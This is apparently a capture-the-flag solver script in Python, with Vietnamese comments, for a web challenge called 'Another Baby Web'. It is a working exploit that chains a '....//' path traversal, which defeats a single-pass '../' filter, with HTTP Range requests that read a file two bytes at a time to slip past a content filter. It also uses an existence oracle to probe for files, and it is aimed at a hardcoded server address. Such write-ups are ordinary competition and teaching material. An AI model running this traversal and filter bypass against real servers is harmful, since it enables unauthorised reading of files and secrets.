#!/usr/bin/env python3
"""Solver: Another Baby Web — path traversal + Range-header content-filter bypass.

Bug 1: resolve() dung user_path.replace("../","") (single-pass) -> "....//"
       thoat khoi /app:  /....//flag.txt  ->  /flag.txt
Bug 2: send_file(..., conditional=True) honor header Range TRUOC khi
       response.get_data() -> bad_data() chi thay dung cac byte minh chon.
       Doc cua so 2 byte (marker ngan nhat "lib" = 3 byte) -> khong bao gio match.

Ket hop: doc file chua chuoi "ASIS{...}" ma khong ding filter.
"""
import base64
import json
import sys
import urllib.parse
import urllib.request

BASE = "http://91.107.191.73:29994/inspect"


def fetch(path, rng):
    req = urllib.request.Request(
        BASE + "?path=" + urllib.parse.quote(path, safe=""))
    req.add_header("Range", rng)
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            return base64.b64decode(json.loads(r.read())["content"])
    except Exception:
        return None  # 400/416 -> vuot EOF hoac file khong ton tai


def exists(path):
    """Oracle: Range 3 byte khong the chua marker 4 byte -> 200 = file ton tai."""
    return fetch(path, "bytes=0-2") is not None


def read_file(path, maxn=65536):
    out = bytearray()
    i = 0
    while i < maxn:
        chunk = fetch(path, f"bytes={i}-{i + 1}")  # cua so 2 byte
        if not chunk:
            break
        out += chunk
        i += len(chunk)
    return bytes(out)


if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "/....//flag.txt"
    print(f"[+] target: {target}")
    print(f"[+] exists: {exists(target)}")
    data = read_file(target)
    print(f"[+] {len(data)} bytes:")
    print(data.decode(errors="replace"))
